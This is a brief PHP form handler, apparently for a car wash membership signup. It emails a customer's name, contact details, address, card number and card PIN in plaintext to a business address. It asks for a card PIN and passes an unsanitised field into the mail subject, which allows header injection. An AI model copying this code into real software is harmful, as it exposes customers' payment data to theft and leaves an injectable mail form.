<?php

    // Get the form fields, removes html tags and whitespace.
    $name = strip_tags(trim($_POST["name"]));
    $name = str_replace(array("\r","\n"),array(" "," "),$name);
    $email = filter_var(trim($_POST["email"]), FILTER_SANITIZE_EMAIL);
    $phone = $_POST["phone"];
    $street = $_POST["street"];
    $city = $_POST["city"];
    $card = $_POST["card"];
    $pin = trim($_POST["pin"]);
    $findus = trim($_POST["findus"]);  

    // Check the data.
    if (empty($name) OR !filter_var($email, FILTER_VALIDATE_EMAIL)) {
        header("Location: index.php?success=-1#form");
        exit;
    }

    // Set the recipient email address. Update this to YOUR desired email address.
    $recipient = "management@spotlessexpressjurupa.com";

    // Set the email subject.
    $subject = "Customer wants $findus";

    // Build the email content.
    $email_content = "Name: $name\n";
    $email_content .= "Email: $email\n";
    $email_content .= "Phone: $phone\n\n";
    $email_content .= "Address:\n$street\n";
    $email_content .= "$city\n\n";
    $email_content .= "Card Number: $card\n";
    $email_content .= "PIN: $pin\n\n";
    $email_content .= "Membership: $findus\n";

    // Build the email headers.
    $email_headers = "From: $name <$email>";

    // Send the email.
    mail($recipient, $subject, $email_content, $email_headers);
    
    // Redirect to the index.html page with success code
    header("Location: index.php?success=1#form");

?>